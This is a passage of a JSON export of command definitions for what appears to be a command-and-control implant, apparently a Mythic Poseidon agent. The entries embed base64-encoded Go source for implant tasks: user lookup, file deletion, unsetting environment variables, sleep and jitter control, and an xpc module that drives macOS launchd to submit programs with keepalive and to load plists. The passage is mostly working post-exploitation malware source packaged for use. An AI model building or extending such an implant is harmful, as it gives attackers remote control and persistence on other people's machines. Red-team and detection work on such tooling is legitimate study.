5hbWUgc3RyaW5nIGBqc29uOiJuYW1lImAKCS8vIEhvbWVEaXIgaXMgdGhlIHBhdGggdG8gdGhlIHVzZXIncyBob21lIGRpcmVjdG9yeSAoaWYgdGhleSBoYXZlIG9uZSkuCglIb21lRGlyIHN0cmluZyBganNvbjoiaG9tZWRpciJgCn0KCi8vUnVuIC0gRnVuY3Rpb24gdGhhdCBleGVjdXRlcyB0aGUgc2hlbGwgY29tbWFuZApmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJY3VyVXNlciwgZXJyIDo9IHVzZXIuQ3VycmVudCgpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCXNlclVzZXIgOj0gU2VyaWFsaXphYmxlVXNlcnsKCQlVaWQ6ICAgICAgY3VyVXNlci5VaWQsCgkJR2lkOiAgICAgIGN1clVzZXIuR2lkLAoJCVVzZXJuYW1lOiBjdXJVc2VyLlVzZXJuYW1lLAoJCU5hbWU6ICAgICBjdXJVc2VyLk5hbWUsCgkJSG9tZURpcjogIGN1clVzZXIuSG9tZURpciwKCX0KCglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJcmVzLCBlcnIgOj0ganNvbi5NYXJzaGFsSW5kZW50KHNlclVzZXIsICIiLCAiICAgICIpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQogICAgbXNnLlVzZXJPdXRwdXQgPSBzdHJpbmcocmVzKQoJbXNnLkNvbXBsZXRlZCA9IHRydWUKCglyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgltdS5Mb2NrKCkKCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCW11LlVubG9jaygpCglyZXR1cm4KfQo="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "rm [path]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Delete a file.",
          "cmd": "rm",
          "parameters": [],
          "attack": [],
          "artifacts": [
            {
              "command_parameter": "null",
              "artifact": "File Create",
              "artifact_string": "Deletes the file specified.",
              "replace_string": ""
            }
          ],
          "files": [
            {
              "rm.go": "cGFja2FnZSBybQoKaW1wb3J0ICgKCSJmbXQiCgkib3MiCgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgoJImVuY29kaW5nL2pzb24iCikKCnZhciBtdSBzeW5jLk11dGV4CgovL1J1biAtIGludGVyZmFjZSBtZXRob2QgdGhhdCByZXRyaWV2ZXMgYSBwcm9jZXNzIGxpc3QKZnVuYyBSdW4odGFzayBzdHJ1Y3RzLlRhc2spIHsKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCWlmIF8sIGVyciA6PSBvcy5TdGF0KHRhc2suUGFyYW1zKTsgb3MuSXNOb3RFeGlzdChlcnIpIHsKCgkJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRmlsZSAnJXMnIGRvZXMgbm90IGV4aXN0LiIsIHRhc2suUGFyYW1zKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCWVyciA6PSBvcy5SZW1vdmUodGFzay5QYXJhbXMpCglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CiAgICBtc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRGVsZXRlZCAlcyIsIHRhc2suUGFyYW1zKQoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "unsetenv [param]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Unset an environment variable.",
          "cmd": "unsetenv",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "unsetenv.go": "cGFja2FnZSB1bnNldGVudgoKaW1wb3J0ICgKCSJmbXQiCgkib3MiCgkic3RyaW5ncyIKCSJwa2cvcHJvZmlsZXMiCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkiZW5jb2RpbmcvanNvbiIKCSJzeW5jIgopCgp2YXIgbXUgc3luYy5NdXRleAoKLy9SdW4gLSBpbnRlcmZhY2UgbWV0aG9kIHRoYXQgcmV0cmlldmVzIGEgcHJvY2VzcyBsaXN0CmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCglwYXJhbXMgOj0gc3RyaW5ncy5UcmltU3BhY2UodGFzay5QYXJhbXMpCgllcnIgOj0gb3MuVW5zZXRlbnYocGFyYW1zKQoKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiU3VjY2Vzc2Z1bGx5IGNsZWFyZWQgJXMiLCBwYXJhbXMpCglyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgltdS5Mb2NrKCkKCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCW11LlVubG9jaygpCglyZXR1cm4KfQo="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "sleep [time in seconds]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Update the sleep interval for the agent",
          "cmd": "sleep",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "jitter"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "sleep"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "xpc {  \"command\": \"list\",  \"program\": \"Program\/binary to execute with the submit command\",  \"file\": \"Path to the plist file. Used with the load\/unload commands\",  \"servicename\": \"\",  \"keepalive\": false,  \"pid\": -1,  \"data\": \"base64 encoded json data to send to a target service\" }",
          "version": 38,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Use xpc to execute routines with launchd or communicate with another service\/process",
          "cmd": "xpc",
          "parameters": [
            {
              "type": "String",
              "hint": "base64 encoded json data to send to a target service",
              "choices": "",
              "required": false,
              "name": "data"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "pid"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "keepalive"
            },
            {
              "type": "String",
              "hint": "Name of the service to communicate with. Used with the submit, send, start\/stop commands ",
              "choices": "",
              "required": false,
              "name": "servicename"
            },
            {
              "type": "String",
              "hint": "Path to the plist file. Used with the load\/unload commands",
              "choices": "",
              "required": false,
              "name": "file"
            },
            {
              "type": "String",
              "hint": "Program\/binary to execute with the submit command",
              "choices": "",
              "required": false,
              "name": "program"
            },
            {
              "type": "Choice",
              "hint": "",
              "choices": "list\nstart\nstop\nload\nunload\nstatus\nprocinfo\nsubmit\nsend",
              "required": true,
              "name": "command"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "xpc_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSB4cGMKCi8qCiNjZ28gTERGTEFHUzogLWZyYW1ld29yayBGb3VuZGF0aW9uCiNjZ28gQ0ZMQUdTOiAtV25vLWVycm9yPWltcGxpY2l0LWZ1bmN0aW9uLWRlY2xhcmF0aW9uCiNpbmNsdWRlIDxkaXNwYXRjaC9kaXNwYXRjaC5oPgojaW5jbHVkZSA8QmxvY2suaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxvYmpjL29iamMuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSAieHBjX3dyYXBwZXJfZGFyd2luLmgiCiovCmltcG9ydCAiQyIKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJlbmNvZGluZy9iYXNlNjQiCgkiZXJyb3JzIgoJImZtdCIKCSJzdHJpbmdzIgoJImxvZyIKCXIicmVmbGVjdCIKCSJ1bnNhZmUiCgkib3MiCgkiaW8vaW91dGlsIgopCgp0eXBlIFhQQyBzdHJ1Y3QgewoJY29ubiBDLnhwY19jb25uZWN0aW9uX3QKfQoKdHlwZSBYcGNNYW4gc3RydWN0IHsKCUVtaXR0ZXIKCWNvbm4gICAgICAgIFhQQwoJc2VydmljZW5hbWUgc3RyaW5nCn0KCmZ1bmMgTmV3KHNlcnZpY2Ugc3RyaW5nLCBwcml2aWxlZ2VkIGludCkgKlhwY01hbiB7Cgl4IDo9ICZYcGNNYW57RW1pdHRlcjogRW1pdHRlcnt9fQoJeC5FbWl0dGVyLkluaXQoKQoJeC5jb25uID0gWHBjQ29ubmVjdChzZXJ2aWNlLCB4LCBwcml2aWxlZ2VkKQoJcmV0dXJuIHgKfQoKZnVuYyAoeCAqWHBjTWFuKSBIYW5kbGVFdmVudChldmVudCBEaWN0LCBlcnIgZXJyb3IpIHsKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybgoJfQoKCS8vIG1hcnNoYWwgdGhlIHhwYy5EaWN0IG9iamVjdCB0byByYXcsIGluZGVudGVkIGpzb24gYW5kIHByaW50IGl0CglyYXcsIGVyciA6PSBqc29uLk1hcnNoYWwoZXZlbnQpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4KCX0KCglyZXN1bHRzID0gcmF3CglyZXR1cm4KfQoKdHlwZSBYcGNFdmVudEhhbmRsZXIgaW50ZXJmYWNlIHsKCUhhbmRsZUV2ZW50KGV2ZW50IERpY3QsIGVyciBlcnJvcikKfQoKZnVuYyAoeCAqWFBDKSBTZW5kKG1zZyBpbnRlcmZhY2V7fSwgdmVyYm9zZSBib29sKSB7CglDLlhwY1NlbmRNZXNzYWdlKHguY29ubiwgZ29Ub1hwYyhtc2cpLCBDLmJvb2wodHJ1ZSksIEMuYm9vbCh2ZXJib3NlKSkKfQoKdHlwZSBEaWN0IG1hcFtzdHJpbmddaW50ZXJmYWNle30KCmZ1bmMgKGQgRGljdCkgQ29udGFpbnMoayBzdHJpbmcpIGJvb2wgewoJXywgb2sgOj0gZFtrXQoJcmV0dXJuIG9rCn0KCmZ1bmMgKGQgRGljdCkgTXVzdEdldERpY3QoayBzdHJpbmcpIERpY3QgewoJcmV0dXJuIGRba10uKERpY3QpCn0KCmZ1bmMgKGQgRGljdCkgTXVzdEdldEFycmF5KGsgc3RyaW5nKSBBcnJheSB7CglyZXR1cm4gZFtrXS4oQXJyYXkpCn0KCmZ1bmMgKGQgRGljdCkgTXVzdEdldEJ5dGVzKGsgc3RyaW5nKSBbXWJ5dGUgewoJcmV0dXJuIGRba10uKFtdYnl0ZSkKfQoKZnVuYyAoZCBEaWN0KSBNdXN0R2V0SGV4Qnl0ZXMoayBzdHJpbmcpIHN0cmluZyB7CglyZXR1cm4gZm10LlNwcmludGYoIiV4IiwgZFtrXS4oW11ieXRlKSkKfQoKZnVuYyAoZCBEaWN0KSBNdXN0R2V0SW50KGsgc3RyaW5nKSBpbnQgewoJcmV0dXJuIGludChkW2tdLihpbnQ2NCkpCn0KCmZ1bmMgKGQgRGljdCkgTXVzdEdldFVVSUQoayBzdHJpbmcpIFVVSUQgewoJcmV0dXJuIGRba10uKFVVSUQpCn0KCmZ1bmMgKGQgRGljdCkgR2V0U3RyaW5nKGssIGRlZnYgc3RyaW5nKSBzdHJpbmcgewoJaWYgdiA6PSBkW2tdOyB2ICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJHZXRTdHJpbmcgJXMgJSN2XG4iLCBrLCB2KQoJCXJldHVybiB2LihzdHJpbmcpCgl9IGVsc2UgewoJCS8vbG9nLlByaW50ZigiR2V0U3RyaW5nICVzIGRlZmF1bHQgJSN2XG4iLCBrLCBkZWZ2KQoJCXJldHVybiBkZWZ2Cgl9Cn0KCmZ1bmMgKGQgRGljdCkgR2V0Qnl0ZXMoayBzdHJpbmcsIGRlZnYgW11ieXRlKSBbXWJ5dGUgewoJaWYgdiA6PSBkW2tdOyB2ICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJHZXRCeXRlcyAlcyAlI3ZcbiIsIGssIHYpCgkJcmV0dXJuIHYuKFtdYnl0ZSkKCX0gZWxzZSB7CgkJLy9sb2cuUHJpbnRmKCJHZXRCeXRlcyAlcyBkZWZhdWx0ICUjdlxuIiwgaywgZGVmdikKCQlyZXR1cm4gZGVmdgoJfQp9CgpmdW5jIChkIERpY3QpIEdldEludChrIHN0cmluZywgZGVmdiBpbnQpIGludCB7CglpZiB2IDo9IGRba107IHYgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkdldFN0cmluZyAlcyAlI3ZcbiIsIGssIHYpCgkJcmV0dXJuIGludCh2LihpbnQ2NCkpCgl9IGVsc2UgewoJCS8vbG9nLlByaW50ZigiR2V0U3RyaW5nICVzIGRlZmF1bHQgJSN2XG4iLCBrLCBkZWZ2KQoJCXJldHVybiBkZWZ2Cgl9Cn0KCmZ1bmMgKGQgRGljdCkgR2V0VVVJRChrIHN0cmluZykgVVVJRCB7CglyZXR1cm4gR2V0VVVJRChkW2tdKQp9CgovLyBhbiBBcnJheSBvZiB0aGluZ3MKdHlwZSBBcnJheSBbXWludGVyZmFjZXt9CgpmdW5jIChhIEFycmF5KSBHZXRVVUlEKGsgaW50KSBVVUlEIHsKCXJldHVybiBHZXRVVUlEKGFba10pCn0KCi8vIGEgVVVJRAp0eXBlIFVVSUQgWzE2XWJ5dGUKCmZ1bmMgTWFrZVVVSUQocyBzdHJpbmcpIFVVSUQgewoJdmFyIHNsIFtdYnl0ZQoKCXMgPSBzdHJpbmdzLlJlcGxhY2UocywgIi0iLCAiIiwgLTEpCglmbXQuU3NjYW5mKHMsICIlMzJ4IiwgJnNsKQoKCXZhciB1dWlkIFsxNl1ieXRlCgljb3B5KHV1aWRbOl0sIHNsKQoJcmV0dXJuIFVVSUQodXVpZCkKfQoKZnVuYyBNdXN0VVVJRChzIHN0cmluZykgVVVJRCB7Cgl2YXIgc2wgW11ieXRlCgoJcyA9IHN0cmluZ3MuUmVwbGFjZShzLCAiLSIsICIiLCAtMSkKCWlmIGxlbihzKSAhPSAzMiB7CgkJbG9nLkZhdGFsKCJpbnZhbGlkIFVVSUQiKQoJfQoJaWYgbiwgZXJyIDo9IGZtdC5Tc2NhbmYocywgIiUzMngiLCAmc2wpOyBlcnIgIT0gbmlsIHx8IG4gIT0gMSB7CgkJbG9nLkZhdGFsKCJpbnZhbGlkIFVVSUQgIiwgcywgIiBsZW4gIiwgbiwgIiBlcnJvciAiLCBlcnIpCgl9CgoJdmFyIHV1aWQgWzE2XWJ5dGUKCWNvcHkodXVpZFs6XSwgc2wpCglyZXR1cm4gVVVJRCh1dWlkKQp9CgpmdW5jICh1dWlkIFVVSUQpIFN0cmluZygpIHN0cmluZyB7CglyZXR1cm4gZm10LlNwcmludGYoIiV4IiwgWzE2XWJ5dGUodXVpZCkpCn0KCmZ1bmMgR2V0VVVJRCh2IGludGVyZmFjZXt9KSBVVUlEIHsKCWlmIHYgPT0gbmlsIHsKCQlyZXR1cm4gVVVJRHt9Cgl9CgoJaWYgdXVpZCwgb2sgOj0gdi4oVVVJRCk7IG9rIHsKCQlyZXR1cm4gdXVpZAoJfQoKCWlmIGJ5dGVzLCBvayA6PSB2LihbXWJ5dGUpOyBvayB7CgkJdXVpZCA6PSBVVUlEe30KCgkJZm9yIGksIGIgOj0gcmFuZ2UgYnl0ZXMgewoJCQl1dWlkW2ldID0gYgoJCX0KCgkJcmV0dXJuIHV1aWQKCX0KCglpZiBieXRlcywgb2sgOj0gdi4oW111aW50OCk7IG9rIHsKCQl1dWlkIDo9IFVVSUR7fQoKCQlmb3IgaSwgYiA6PSByYW5nZSBieXRlcyB7CgkJCXV1aWRbaV0gPSBiCgkJfQoKCQlyZXR1cm4gdXVpZAoJfQoKCWxvZy5GYXRhbGYoImludmFsaWQgdHlwZSBmb3IgVVVJRDogJSN2IiwgdikKCXJldHVybiBVVUlEe30KfQoKdmFyICgKCUNPTk5FQ1RJT05fSU5WQUxJRCAgICAgPSBlcnJvcnMuTmV3KCJjb25uZWN0aW9uIGludmFsaWQiKQoJQ09OTkVDVElPTl9JTlRFUlJVUFRFRCA9IGVycm9ycy5OZXcoImNvbm5lY3Rpb24gaW50ZXJydXB0ZWQiKQoJQ09OTkVDVElPTl9URVJNSU5BVEVEICA9IGVycm9ycy5OZXcoImNvbm5lY3Rpb24gdGVybWluYXRlZCIpCgoJVFlQRV9PRl9VVUlEICA9IHIuVHlwZU9mKFVVSUR7fSkKCVRZUEVfT0ZfQllURVMgPSByLlR5cGVPZihbXWJ5dGV7fSkKCgloYW5kbGVycyA9IG1hcFt1aW50cHRyXVhwY0V2ZW50SGFuZGxlcnt9CikKCgoKZnVuYyBydW5Db21tYW5kKGNvbW1hbmQgc3RyaW5nKSAoW11ieXRlLCBlcnJvcikgewoJc3dpdGNoIGNvbW1hbmQgewoJY2FzZSAibGlzdCI6CgkJaWYgbGVuKGFyZ3MuU2VydmljZU5hbWUpID09IDAgewoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hMaXN0KCIiKQoJCQlyZXNwb25zZSA9IHJlc3BvbnNlLihEaWN0KQoJCQlyYXcsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQocmVzcG9uc2UsICIiLCAiCSIpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJZW1wdHkgOj0gbWFrZShbXWJ5dGUsIDApCgkJCQlyZXR1cm4gZW1wdHksIGVycgoJCQl9CgoJCQlyZXR1cm4gcmF3LCBlcnIKCQl9IGVsc2UgewoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hMaXN0KGFyZ3MuU2VydmljZU5hbWUpCgkJCXJlc3BvbnNlID0gcmVzcG9uc2UuKERpY3QpCgkJCXJhdywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyZXNwb25zZSwgIiIsICIJIikKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllbXB0eSA6PSBtYWtlKFtdYnl0ZSwgMCkKCQkJCXJldHVybiBlbXB0eSwgZXJyCgkJCX0KCgkJCXJldHVybiByYXcsIGVycgoJCX0KCQlicmVhawoJY2FzZSAic3RhcnQiOgoJCWlmIGxlbihhcmdzLlNlcnZpY2VOYW1lKSA9PSAwIHsKCQkJZW1wdHkgOj0gbWFrZShbXWJ5dGUsIDApCgkJCXJldHVybiBlbXB0eSwgZXJyb3JzLk5ldygiTWlzc2luZyBzZXJ2aWNlIG5hbWUgYXJndW1lbnQiKQoJCX0gZWxzZSB7CgkJCXJlc3BvbnNlIDo9IFhwY0xhdW5jaENvbnRyb2woYXJncy5TZXJ2aWNlTmFtZSwgMSkKCQkJcmVzcG9uc2UgPSByZXNwb25zZS4oRGljdCkKCQkJcmF3LCBlcnIgOj0ganNvbi5NYXJzaGFsSW5kZW50KHJlc3BvbnNlLCAiIiwgIgkiKQoJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQkJcmV0dXJuIGVtcHR5LCBlcnIKCQkJfQoKCQkJcmV0dXJuIHJhdywgZXJyCgkJfQoJCWJyZWFrCgljYXNlICJzdG9wIjoKCQlpZiBsZW4oYXJncy5TZXJ2aWNlTmFtZSkgPT0gMCB7CgkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQlyZXR1cm4gZW1wdHksIGVycm9ycy5OZXcoIk1pc3Npbmcgc2VydmljZSBuYW1lIGFyZ3VtZW50IikKCQl9IGVsc2UgewoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hDb250cm9sKGFyZ3MuU2VydmljZU5hbWUsIDApCgkJCXJlc3BvbnNlID0gcmVzcG9uc2UuKERpY3QpCgkJCXJhdywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyZXNwb25zZSwgIiIsICIJIikKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllbXB0eSA6PSBtYWtlKFtdYnl0ZSwgMCkKCQkJCXJldHVybiBlbXB0eSwgZXJyCgkJCX0KCgkJCXJldHVybiByYXcsIGVycgoJCX0KCQlicmVhawoJY2FzZSAibG9hZCI6CgkJaWYgbGVuKGFyZ3MuRmlsZSkgPT0gMCB7CgkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQlyZXR1cm4gZW1wdHksIGVycm9ycy5OZXcoIk1pc3NpbmcgZmlsZSBuYW1lIGFyZ3VtZW50IikKCQl9IGVsc2UgewoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hMb2FkUGxpc3QoYXJncy5GaWxlKQoJCQlyZXNwb25zZSA9IHJlc3BvbnNlLihEaWN0KQoJCQlyYXcsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQocmVzcG9uc2UsICIiLCAiCSIpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJZW1wdHkgOj0gbWFrZShbXWJ5dGUsIDApCgkJCQlyZXR1cm4gZW1wdHksIGVycgoJCQl9CgoJCQlyZXR1cm4gcmF3LCBlcnIKCQl9CgkJYnJlYWsKCWNhc2UgInVubG9hZCI6CgkJaWYgbGVuKGFyZ3MuRmlsZSkgPT0gMCB7CgkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQlyZXR1cm4gZW1wdHksIGVycm9ycy5OZXcoIk1pc3NpbmcgZmlsZSBuYW1lIGFyZ3VtZW50IikKCQl9IGVsc2UgewoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hVbmxvYWRQbGlzdChhcmdzLkZpbGUpCgkJCXJlc3BvbnNlID0gcmVzcG9uc2UuKERpY3QpCgkJCXJhdywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyZXNwb25zZSwgIiIsICIJIikKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllbXB0eSA6PSBtYWtlKFtdYnl0ZSwgMCkKCQkJCXJldHVybiBlbXB0eSwgZXJyCgkJCX0KCgkJCXJldHVybiByYXcsIGVycgoJCX0KCQlicmVhawoJY2FzZSAic3RhdHVzIjoKCQlpZiBsZW4oYXJncy5TZXJ2aWNlTmFtZSkgPT0gMCB7CgkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQlyZXR1cm4gZW1wdHksIGVycm9ycy5OZXcoIk1pc3Npbmcgc2VydmljZSBuYW1lIGFyZ3VtZW50IikKCQl9IGVsc2UgewoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hTdGF0dXMoYXJncy5TZXJ2aWNlTmFtZSkKCQkJcmVzcG9uc2UgPSByZXNwb25zZS4oRGljdCkKCQkJcmF3LCBlcnIgOj0ganNvbi5NYXJzaGFsSW5kZW50KHJlc3BvbnNlLCAiIiwgIgkiKQoJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQkJcmV0dXJuIGVtcHR5LCBlcnIKCQkJfQoKCQkJcmV0dXJuIHJhdywgZXJyCgkJfQoJCWJyZWFrCgljYXNlICJwcm9jaW5mbyI6CgkJcmVzcG9uc2UgOj0gWHBjTGF1bmNoUHJvY0luZm8oYXJncy5QaWQpCgoJCXJldHVybiBbXWJ5dGUocmVzcG9uc2UpLCBuaWwKCWNhc2UgInN1Ym1pdCI6CgkJaWYgbGVuKGFyZ3MuU2VydmljZU5hbWUpID09IDAgewoJCQllbXB0eSA6PSBtYWtlKFtdYnl0ZSwgMCkKCQkJcmV0dXJuIGVtcHR5LCBlcnJvcnMuTmV3KCJNaXNzaW5nIHNlcnZpY2UgbmFtZSBhcmd1bWVudCIpCgkJfSBlbHNlIGlmIGxlbihhcmdzLlByb2dyYW0pID09IDAgewoJCQllbXB0eSA6PSBtYWtlKFtdYnl0ZSwgMCkKCQkJcmV0dXJuIGVtcHR5LCBlcnJvcnMuTmV3KCJNaXNzaW5nIHByb2dyYW0gYXJndW1lbnQiKQoJCX0gZWxzZSB7CgkJCXZhciBrIGludAoJCQlpZiBhcmdzLktlZXBBbGl2ZSB7CgkJCQlrID0gMQoJCQl9IGVsc2UgewoJCQkJayA9IDAKCQkJfQoJCQlyZXNwb25zZSA6PSBYcGNMYXVuY2hTdWJtaXQoYXJncy5TZXJ2aWNlTmFtZSwgYXJncy5Qcm9ncmFtLCBrKQoJCQlyZXNwb25zZSA9IHJlc3BvbnNlLihEaWN0KQoJCQlyYXcsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQocmVzcG9uc2UsICIiLCAiCSIpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJZW1wdHkgOj0gbWFrZShbXWJ5dGUsIDApCgkJCQlyZXR1cm4gZW1wdHksIGVycgoJCQl9CgkKCQkJcmV0dXJuIHJhdywgZXJyCgkJfQoJCWJyZWFrCgljYXNlICJzZW5kIjoKCQlpZiBsZW4oYXJncy5EYXRhKSA9PSAwIHx8IGxlbihhcmdzLlNlcnZpY2VOYW1lKSA9PSAwIHsKCQkJZW1wdHkgOj0gbWFrZShbXWJ5